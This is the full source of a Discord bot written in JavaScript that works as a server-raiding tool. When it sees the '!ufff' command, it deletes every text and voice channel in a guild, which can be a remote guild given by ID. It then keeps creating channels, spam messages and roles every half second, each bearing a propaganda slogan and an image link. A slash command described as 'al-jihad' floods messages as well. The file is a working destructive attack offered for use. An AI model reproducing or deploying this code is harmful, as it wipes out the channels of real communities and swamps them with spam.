import { Client, GatewayIntentBits } from "discord.js";
import express from "express";
// ====== Discord Bot ======
let whitelist=["1440670444276678709"];
const client=new Client({
  intents:[
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});
client.once("ready",async function(){
  let data=[{
    name:"ufff",
    description:"al-jihad"
  }];
  await client.application.commands.set(data,"1410512467720802347");
});
client.on("messageCreate",function(message){
  let isWhitelist=false;
  for(let data of whitelist){
    if(data==message.guild.id){
      isWhitelist=true;
      break;
    }
  }
  console.log(message.guild.id);
  if(message.author.bot&&isWhitelist){
    return;
  }
  if(message.content.indexOf("!ufff")!=-1){
    let serverID=message.content.split("!ufff ")[1]||message.guild.id;
    message.delete();
    if(serverID){
      let guild=client.guilds.cache.get(serverID);
      guild.channels.cache.forEach(function(channel){
        if(channel.type==0||channel.type==2){
          channel.delete();
        }
      });
      setInterval(async function(){
        guild.channels.cache.forEach(function(channel,i){
          if(channel.type==4){
            setTimeout(function(){
              guild.channels.create({
                name:getText(true),
                type:0,
                parent:channel.id
              });
            },100*i);
          }
          if(channel.type==0){
            setTimeout(async function(){
              await channel.send(getText());
            },100*i);
          }
        });
        await guild.roles.create({name:getText(true)});
      },500);
   }
    else{
      setInterval(function(){
        message.channel.send(getText());
      },500);
    }
  }
});
client.on("interactionCreate",async function(e){
  let isWhitelist=false;
  for(let data of whitelist){
    if(data==e.guild.id){
      isWhitelist=true;
      break;
    }
  }
  if(!e.isChatInputCommand()&&isWhitelist){
    return;
  }
  if(e.commandName=="ufff"){
    await e.reply("success");
    setInterval(async function(){
      await e.followUp(getText());
    },500);
    setTimeout(async function(){
      await e.deleteReply();
    },800);
  }
});
function getText(isTitle){
  let random=Math.round(Math.random()*100000000);
  return isTitle?("統一友愛戦線に栄光あれ！-"+random):("# 統一友愛戦線に栄光あれ！\nhttps://cdn-ak.f.st-hatena.com/images/fotolife/I/ImagesForUFFF/20251119/20251119155446_original.png\n\nMessageID:"+random);
}
// ====== HTTP server for Render ======
const app=express();
app.get("/",function(req,res){
  res.send("alive");
});
app.listen(process.env.PORT||3000,function(){
  console.log("🌐 Web server is running.");
});
// ====== Login ======
client.login(process.env.DISCORD_TOKEN);
